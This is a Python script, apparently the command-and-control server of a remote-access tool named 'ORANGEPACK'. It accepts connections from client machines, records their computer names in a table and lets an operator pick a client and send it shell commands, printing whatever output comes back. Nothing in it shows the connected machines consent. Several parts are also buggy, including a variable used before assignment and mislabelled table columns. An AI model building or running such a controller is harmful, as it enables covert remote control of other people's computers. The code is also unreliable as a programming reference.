from threading import Thread
import socket
from os import system
from time import sleep
from prettytable import PrettyTable
from colorama import just_fix_windows_console
from colorama import Fore, Back, Style
just_fix_windows_console()
server = socket.socket()

#Settings (
server.bind(("127.0.0.1", 2009))
server.setblocking(True)
#)



print("ORANGEPACK created by VOV4OK")
a = ""
It = False

ab = True
         


def sending(sock) -> str:#Ця функція буде надсилати команду на кліент а потім поверне дані з нього
    
    while True:
        print(Fore.WHITE)
        global a
  
        command = input(":")
        c_split = command.split()[0]
        
        if  c_split != "cls" and c_split != "usersTable" and c_split != "changeId":
            
            sock.send(command.encode("cp866"))
                
                
            run = True
            errors = 0
                
            while run:
                    try:
                        run = False
                        a = sock.recv(5048).decode("cp866")
                        #sleep(2)
                        print(a)
                            

                            
                    except:
                        if errors <= 300:
                            errors+=1
                        else:
                                run = False

            
            

            else:
                if c_split == "cls":
                    system("cls")
                if c_split == "usersTable":
                    print(Fore.YELLOW + get_table())
                if c_split == "changeId":
                    print(Fore.YELLOW + get_table())
                    print(Fore.BLUE)
                    id = input ("ID: ")
                    if client_id != 0:
                        for c in clients:
                            if c[1] == id:
                                x.join()
                                x = Thread(target=sending, args=[c[0],])
                                x.start()



def get_table() -> PrettyTable:
    global client
    cl = ["ID", "COMPUTER_NAME", "CMD_NAME"]
    #columns = len(cl)
    table = PrettyTable()
    table.field_names = cl
    for c in clients:
        table.add_row([c[1], c[1], c[3]])
    return str(table)




server.listen(4)

#table = PrettyTable()
#table.field_names = cl

clients = []


client_id = 0

sending_is_run = False

while True:
    

        sock, addr = server.accept()
        

        #print(Fore.RED + "CLICK ENTER!" + Fore.WHITE)
        
        n = sock.recv(512).decode("cp866")
        id = len(clients)+1
        #print(sock)
        client = [sock, id, n, "-"]
        clients.append(client)

        
        
        
        if clients != [client]:
            ab = False
            print("New client connected , please type ENTER. ")
        print("\n")
        print(Fore.YELLOW)
        name = input(get_table()+"Please type the name for cmd: ")
        print(Fore.BLUE)

        for c in clients:
            if c[1] == id:
                c[3] = name

        print(Fore.YELLOW + get_table(), end="\n\n\n\n\n")
        print(Fore.BLUE)
        if len(clients) != 0:
            client_id = int(input("Please type client id: "))

        if client_id != 0:
                    for c in clients:
                        if c[1] == client_id:
                            #x.join()
                            x = Thread(target=sending, args=[c[0],])
                            x.start()
                            sending_is_run = True
                            

            
            
        

        


        

    

    

    






